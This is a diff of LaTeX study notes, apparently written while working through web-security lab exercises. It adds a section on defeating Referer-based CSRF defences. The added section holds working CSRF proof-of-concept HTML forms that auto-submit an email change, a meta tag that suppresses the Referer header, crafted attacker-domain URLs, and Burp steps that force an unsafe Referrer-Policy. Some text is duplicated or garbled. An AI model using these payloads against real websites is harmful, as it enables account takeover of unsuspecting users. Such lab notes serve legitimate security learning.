@@ -193,13 +193,102 @@ The attacker can again perform a CSRF attack if the website contains any cookie 
 \section*{SameSite cookies bypass}
 SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces Lax SameSite restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future. 
 
-\section*{CSRF tokens bypass}
+\newpage
+
+\section*{Bypassing Referer-based CSRF defenses}
 Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation. 
 
 
+\subsection*{Referer header}
+The HTTP Referer header (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form. Various methods exist that allow the linking page to withhold or modify the value of the Referer header. This is often done for privacy reasons.
 
+\begin{enumerate}
+	\item \textbf{Validation of Referer depends on header being present}\\Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. 
+	 Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.\\
 
+In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack: 
+\begin{lstlisting}[frame=single]
+<meta name="referrer" content="never">
+\end{lstlisting}
+Note $\Longrightarrow$ the meta tag is in the header not the body of the HTML page so, CSRF POC look like
 
+\begin{lstlisting}[frame=single]
+<html>
+  <head>
+     <meta name="referrer" content="never">
+  <head>
+  <body>
+    <form action="website.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="er&#64;mal&#45;user&#46"/>
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
 
+\end{lstlisting}
+
+\item \textbf{Validation of Referer can be circumvented}\\
+Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain: 
+
+\begin{lstlisting}[frame=single]
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+\end{lstlisting}
+Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL: 
+\begin{lstlisting}[frame=single]
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+\end{lstlisting}
+
+Note $\Longrightarrow$  Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the Referer header by default.\\
+
+You can override this behavior by making sure that the response containing your exploit has the "Referrer-Policy: unsafe-url" header set (note that Referrer is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string. 
+
+\subsection*{How to Add "Referrer-Policy: unsafe-url" Correctly}
+\begin{itemize}
+\item Go to Proxy → Settings in Burp
+\item Find the Match and Replace section
+\item Click Add
+\item Configure the rule:
+	\begin{itemize}
+		\item    Type: Replace response header
+		\item   Match: Referrer-Policy
+		\item   Replace: Referrer-Policy: unsafe-url
+	\end{itemize}
+\item Click OK
+\end{itemize}
+Now when your browser requests the PoC HTML, Burp will automatically add the correct header to the server's response.
+
+Note $\Longrightarrow$ If you found the CSRF and you will make the POC make first the Referer using realserver then like burpsuite (the vuln web still just a query parameter)
+\begin{lstlisting}[frame=single]
+Referer:https://burpsuite/?0ae30066047b8a858251259a00ed0054.web-secu
+rity-academy.net
+\end{lstlisting}
+
+And the POC look like
+
+\begin{lstlisting}[frame=single]
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0ae30066047b8a858251259a00ed0054.web-secur
+    ity-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="ssf&#64;mdsail&#46;com"/>
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/?0ae30066047b8a858251259a00ed0054.web-s
+      ecurity-academy.net');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+\end{lstlisting}
+
+Note $\Longrightarrow$ the last parameter in method "history.pushState" is the query parameter which is the vuln website as you see
+
+\end{enumerate}
 
 \end{document}
